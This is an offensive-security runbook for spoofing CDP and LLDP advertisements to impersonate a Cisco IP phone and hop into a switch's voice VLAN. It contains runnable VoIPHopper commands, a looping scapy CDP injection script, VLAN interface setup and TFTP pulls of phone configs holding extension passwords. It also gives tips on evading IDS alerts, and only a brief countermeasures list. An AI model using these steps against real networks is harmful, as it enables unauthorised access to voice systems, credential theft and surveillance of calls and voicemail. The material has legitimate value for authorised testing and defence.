# LLDP / CDP Spoofing

## When this applies

- Target is a switch / VoIP-enabled environment that uses CDP (Cisco) or LLDP (vendor-neutral) for port classification, voice VLAN assignment, or PoE management.
- Attacker is on a port that listens for these protocols.
- Goal is to impersonate an IP phone or trusted device to be moved into the voice VLAN, granted PoE, or to inject misleading topology into network management tools.

## Technique

CDP and LLDP are unauthenticated L2 advertisements. By emitting a crafted CDP/LLDP frame claiming to be a Cisco IP phone (or other privileged device), the attacker can trigger the switch to:
- Assign the port to the voice VLAN (CDP `Voice VLAN ID` TLV)
- Boost PoE allocation (LLDP-MED Power TLV)
- Update the network topology view with attacker-controlled metadata

The voice VLAN is often less segmented from sensitive resources than the data VLAN — VoIP signaling, call recordings, voicemail servers.

## Steps

### 1. Listen for existing CDP / LLDP frames

```bash
# CDP (Cisco) — multicast 01:00:0c:cc:cc:cc, SNAP type 0x2000
sudo tcpdump -i eth0 -nn -e 'ether host 01:00:0c:cc:cc:cc and ether[16:2]==0x2000'

# LLDP — multicast 01:80:c2:00:00:0e
sudo tcpdump -i eth0 -nn -e 'ether host 01:80:c2:00:00:0e'

# Wireshark filter: cdp or lldp
```

Capture for 60–90 seconds (CDP/LLDP send every 30s default). The frames disclose:
- Switch model and IOS/firmware version
- Native VLAN ID, voice VLAN ID
- Allowed VLANs on the port
- Port name (often reveals function: `gi0/24-VOICE`)

### 2. Use VoIPHopper for voice-VLAN hopping

```bash
# Auto-detect CDP and emulate IP phone
sudo voiphopper -i eth0 -z

# Manually craft assertion
sudo voiphopper -i eth0 -c 0 -v 100 -E "SEP001122334455" -P "P00000000010" -d "Cisco IP Phone 7960" -B
```

After ~60 seconds, the switch reassigns the port to the voice VLAN. Bring up a tagged sub-interface for that VLAN:

```bash
sudo ip link add link eth0 name eth0.100 type vlan id 100
sudo ip link set eth0.100 up
sudo dhclient eth0.100
```

### 3. Manual scapy CDP injection

```python
from scapy.all import *
from scapy.contrib.cdp import (
    CDPMsgDeviceID, CDPMsgPortID, CDPMsgCapabilities,
    CDPMsgSoftwareVersion, CDPMsgPlatform, CDPv2_HDR, CDPMsgVoIPVLANReply,
)

frame = (
    Ether(dst="01:00:0c:cc:cc:cc", src=RandMAC())
    / LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
    / SNAP(OUI=0xc, code=0x2000)
    / CDPv2_HDR(vers=2, ttl=180)
    / CDPMsgDeviceID(val=b"SEPDEADBEEFCAFE")
    / CDPMsgPortID(iface=b"Port 1")
    / CDPMsgCapabilities(cap=0x0020)               # 0x20 = IP Phone
    / CDPMsgSoftwareVersion(val=b"P00308000800")
    / CDPMsgPlatform(val=b"Cisco IP Phone 7940")
    / CDPMsgVoIPVLANReply(vlan=100)
)
sendp(frame, iface="eth0", inter=30, loop=1)
```

### 4. LLDP-MED for PoE / capability assertion

```python
# scapy LLDP-MED frame asserting telephone capability + PoE
# Vendor-specific TLVs in LLDP-MED: type=127, OUI=00:12:bb (TIA)
# See LLDP-MED standard for TLV structure
```

LLDP-MED is more interoperable than CDP — modern non-Cisco switches respect it. Yersinia includes an LLDP module.

### 5. Pivot into voice VLAN

Once on the voice VLAN, common targets:
- Call manager / Cisco Unified Communications Manager (CUCM) — port 8080/8443
- Voicemail servers (typically web admin on port 80/443)
- SCCP/SIP signaling — sniff with `sipvicious`, `sccpsim`
- TFTP server providing phone configs (`SEP*.cnf.xml` files contain extension passwords, dial plan, server IPs)

```bash
# Common phone config path
tftp -v cucm.example.local
> get SEP001122334455.cnf.xml
```

### 6. Detection / countermeasures to document

- `lldp run` / `cdp run` should be disabled on user-facing access ports
- Voice VLAN assignment should be MAC-based (only known phone MACs), not CDP-based
- Network management tools should alert on duplicate device IDs or sudden topology changes

## Verifying success

- Switch reassigns the attacker's port to the voice VLAN (`show interface status` if any switch read access).
- Tagged frames in the voice VLAN appear on `eth0` once a sub-interface is configured.
- DHCP lease in the voice VLAN range obtained.
- Reachability to CUCM / TFTP / voicemail confirmed.

## Common pitfalls

- **Switch must trust CDP for VLAN assignment** — Cisco's `switchport voice vlan X` with `mac-based` mode ignores CDP.
- **LLDP-MED policy** on modern switches may use signature validation (rare, but check).
- **Spoofed device IDs collide** — pick a SEP-style MAC that doesn't match any real phone on the network.
- **TTL** in CDP/LLDP TLVs governs how long the switch remembers the assertion. 180s default — keep injecting at 30s intervals.
- **Some IDS/NDR** alerts on duplicate device IDs or unexpected device classes appearing on a port. Profile the network first.
- **Phone authentication** (802.1X, MAC Authentication Bypass) blocks the port until valid creds — voice-VLAN hopping presupposes the port is already up.

## Tools

- VoIPHopper (CDP-based voice VLAN hopping helper)
- Yersinia (CDP / LLDP / DTP attacks)
- scapy + scapy-contrib (manual CDP/LLDP frame crafting)
- Wireshark / tcpdump (verifying received TLVs)
- sipvicious, sccpsim (post-pivot VoIP enumeration)
- nmap (scan voice VLAN once on it)
